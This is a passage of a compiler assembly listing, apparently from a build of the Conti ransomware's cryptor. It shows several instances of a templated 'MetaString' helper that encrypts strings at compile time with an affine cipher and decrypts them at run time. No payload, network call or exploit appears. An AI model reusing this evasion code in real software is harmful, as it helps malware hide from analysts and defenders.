; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 01	 mov	 BYTE PTR [rcx+1], 1
  00007	c6 41 02 36	 mov	 BYTE PTR [rcx+2], 54	; 00000036H
  0000b	c6 41 03 2e	 mov	 BYTE PTR [rcx+3], 46	; 0000002eH
  0000f	c6 41 04 36	 mov	 BYTE PTR [rcx+4], 54	; 00000036H
  00013	c6 41 05 79	 mov	 BYTE PTR [rcx+5], 121	; 00000079H
  00017	c6 41 06 36	 mov	 BYTE PTR [rcx+6], 54	; 00000036H
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 36	 mov	 BYTE PTR [rcx+8], 54	; 00000036H
  00023	c6 41 09 36	 mov	 BYTE PTR [rcx+9], 54	; 00000036H
  00027	c6 41 0a 36	 mov	 BYTE PTR [rcx+10], 54	; 00000036H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 03	 sub	 ecx, 3

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 17	 mov	 BYTE PTR [rcx+1], 23
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 12	 mov	 BYTE PTR [rcx+3], 18
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 46	 mov	 BYTE PTR [rcx+5], 70	; 00000046H
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 24	 mov	 BYTE PTR [rcx+7], 36	; 00000024H
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 40 00 00 00	 mov	 eax, 64			; 00000040H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 01	 mov	 BYTE PTR [rcx+1], 1
  00007	c6 41 02 40	 mov	 BYTE PTR [rcx+2], 64	; 00000040H
  0000b	c6 41 03 53	 mov	 BYTE PTR [rcx+3], 83	; 00000053H
  0000f	c6 41 04 40	 mov	 BYTE PTR [rcx+4], 64	; 00000040H
  00013	c6 41 05 61	 mov	 BYTE PTR [rcx+5], 97	; 00000061H
  00017	c6 41 06 40	 mov	 BYTE PTR [rcx+6], 64	; 00000040H
  0001b	c6 41 07 77	 mov	 BYTE PTR [rcx+7], 119	; 00000077H
  0001f	c6 41 08 40	 mov	 BYTE PTR [rcx+8], 64	; 00000040H
  00023	c6 41 09 40	 mov	 BYTE PTR [rcx+9], 64	; 00000040H
  00027	c6 41 0a 40	 mov	 BYTE PTR [rcx+10], 64	; 00000040H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 45	 sub	 ecx, 69			; 00000045H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 62	 mov	 BYTE PTR [rcx+1], 98	; 00000062H
  00007	c6 41 02 45	 mov	 BYTE PTR [rcx+2], 69	; 00000045H
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 45	 mov	 BYTE PTR [rcx+4], 69	; 00000045H
  00013	c6 41 05 73	 mov	 BYTE PTR [rcx+5], 115	; 00000073H
  00017	c6 41 06 45	 mov	 BYTE PTR [rcx+6], 69	; 00000045H
  0001b	c6 41 07 38	 mov	 BYTE PTR [rcx+7], 56	; 00000038H
  0001f	c6 41 08 45	 mov	 BYTE PTR [rcx+8], 69	; 00000045H
  00023	c6 41 09 45	 mov	 BYTE PTR [rcx+9], 69	; 00000045H
  00027	c6 41 0a 45	 mov	 BYTE PTR [rcx+10], 69	; 00000045H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 66 00 00 00	 mov	 eax, 102		; 00000066H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2b	 mov	 BYTE PTR [rcx+1], 43	; 0000002bH
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 75	 mov	 BYTE PTR [rcx+3], 117	; 00000075H
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 0b	 mov	 BYTE PTR [rcx+5], 11
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 13	 mov	 BYTE PTR [rcx+7], 19
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 79	 sub	 ecx, 121		; 00000079H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
